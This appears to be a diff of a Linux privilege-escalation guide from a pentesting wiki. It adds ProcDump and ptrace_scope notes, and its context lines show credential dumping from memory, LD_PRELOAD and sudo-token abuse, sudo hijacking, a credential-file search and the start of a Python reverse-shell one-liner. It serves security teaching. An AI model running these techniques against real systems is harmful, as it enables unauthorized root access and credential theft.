@@ -234,6 +234,17 @@ Some services of a server save **credentials in clear text inside the memory**.\
 Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
 However, remember that **as a regular user you can read the memory of the processes you own**.
 
+{% hint style="warning" %}
+Note that nowadays most machines **don't allow ptrace by default** which means that you  cannot dump other processes that belongs to your unprivileged user.
+
+The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of ptrace:
+
+* **kernel.yama.ptrace\_scope = 0**: all processes can be debugged, as long as they have same uid. This is the classical way of how ptracing worked.
+* **kernel.yama.ptrace\_scope = 1**: only a parent process can be debugged.
+* **kernel.yama.ptrace\_scope = 2**: Only admin can use ptrace, as it required CAP\_SYS\_PTRACE capability.
+* **kernel.yama.ptrace\_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
+{% endhint %}
+
 #### GDB
 
 If you have access to the memory of a FTP service (for example) you could get the Heap and search inside of it the credentials.
@@ -288,10 +299,42 @@ Typically, `/dev/mem` is only readable by **root** and **kmem** group.
 strings /dev/mem -n10 | grep -i PASS
 ```
 
+#### ProcDump for linux
+
+ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. Get it in [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+
+```
+procdump -p 1714             
+
+ProcDump v1.2 - Sysinternals process dump utility
+Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
+Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
+Monitors a process and writes a dump file when the process meets the
+specified criteria.
+
+Process:		sleep (1714)
+CPU Threshold:		n/a
+Commit Threshold:	n/a
+Thread Threshold:		n/a
+File descriptor Threshold:		n/a
+Signal:		n/a
+Polling interval (ms):	1000
+Threshold (s):	10
+Number of Dumps:	1
+Output directory for core dumps:	.
+
+Press Ctrl-C to end monitoring without terminating the process.
+
+[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
+[20:20:58 - INFO]: Timed:
+[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
+```
+
 #### Tools
 
 To dump a process memory you could use:
 
+* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)****
 * [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - _You can manually remove root requirements and dump process owned by you_
 * Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)
 
@@ -482,7 +525,7 @@ Sockets can be configured using `.socket` files.
 
 **Learn more about sockets with `man systemd.socket`.** Inside this file some several interesting parameters can be configured:
 
-* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: This options are different but as summary as used to **indicate where is going to listen** the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen...).
+* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: This options are different but as summary as used to **indicate where is going to listen** the socket (the path of the AF\_UNIX socket file, the IPv4/6 and/or port number to listen...).
 * `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
 * `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
 * `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
@@ -700,7 +743,7 @@ gpg --list-keys 2>/dev/null
 
 ### Big UID
 
-Some Linux versions were affected by a bug that allow users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
+Some Linux versions were affected by a bug that allow users with **UID > INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
 **Exploit it** using: **`systemd-run -t /bin/bash`**
 
 ### Groups
@@ -849,13 +892,13 @@ export -f /usr/sbin/service
 
 Then, when you call the suid binary, this function will be executed
 
-### LD_PRELOAD
+### LD\_PRELOAD
 
-**LD_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+**LD\_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
 
-To avoid this mechanism being used as an attack vector for _suid/sgid_ executable binaries, the loader ignores _LD_PRELOAD_ if _ruid != euid_. For such binaries, only libraries in standard paths that are also _suid/sgid_ will be preloaded.
+To avoid this mechanism being used as an attack vector for _suid/sgid_ executable binaries, the loader ignores _LD\_PRELOAD_ if _ruid != euid_. For such binaries, only libraries in standard paths that are also _suid/sgid_ will be preloaded.
 
-If you find inside the output of **`sudo -l`** the sentence: _**env_keep+=LD_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.
+If you find inside the output of **`sudo -l`** the sentence: _**env\_keep+=LD\_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.
 
 ```
 Defaults        env_keep += LD_PRELOAD
@@ -897,7 +940,7 @@ If you find some weird binary with **SUID** permissions, you could check if all 
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
 
-For example, if you find something like: _pen(“/home/user/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)_ you can exploit it.
+For example, if you find something like: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ you can exploit it.
 
 Create the file _/home/user/.config/libcalc.c_ with the code:
 
@@ -950,7 +993,7 @@ Requirements to escalate privileges:
 
 (You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)
 
-If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
+If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)
 
 * The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
 
@@ -976,7 +1019,7 @@ sudo su
 
 ### /var/run/sudo/ts/\<Username>
 
-If you have **write permissions** in the folder or on any of the created files inside the folder you can use the binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) to **create a sudo token for a user and PID**.\
+If you have **write permissions** in the folder or on any of the created files inside the folder you can use the binary [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) to **create a sudo token for a user and PID**.\
 For example if you can overwrite the file _/var/run/sudo/ts/sampleuser_ and you have a shell as that user with PID 1234, you can **obtain sudo privileges** without needing to know the password doing:
 
 ```bash
@@ -1019,9 +1062,9 @@ permit nopass demo as root cmd vim
 
 ### Sudo Hijacking
 
-If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the users command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so we the user executed sudo, your sudo executable is executed.
+If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the users command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash\_profile) so we the user executed sudo, your sudo executable is executed.
 
-Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
+Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)
 
 ## Shared Library
 
@@ -1320,7 +1363,7 @@ find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -p
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
 
-### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
+### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 
 ```bash
 fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null`Hidden files
@@ -1403,7 +1446,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ### Logrotate exploitation
 
-There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash_completion.d/**_ that will be executed by any user that login.\
+There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_ that will be executed by any user that login.\
 So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** (on most linux distributions, logrotate is executed automatically once a day as **user root**). Also, check if apart of _/var/log_ there are more files being **rotated**.
 
 {% hint style="info" %}
@@ -1434,7 +1477,7 @@ DEVICE=eth0
 
 (_Note the black space between Network and /bin/id_)
 
-**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)\*\*\*\*
+**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)\*\*\*\*
 
 ### **init, init.d, systemd, and rc.d**
 
@@ -1451,7 +1494,7 @@ Files that ships in packages downloaded from distribution repository go into `/u
 ### NFS Privilege escalation
 
 {% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
-[nfs-no_root_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
+[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
 {% endcontent-ref %}
 
 ### Escaping from restricted Shells
@@ -1473,7 +1516,7 @@ Files that ships in packages downloaded from distribution repository go into `/u
 
 ## More help
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)
 
 ## Linux/Unix Privesc Tools
 
@@ -1485,7 +1528,7 @@ Files that ships in packages downloaded from distribution repository go into `/u
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
 **Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
-**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
+**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
 **Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
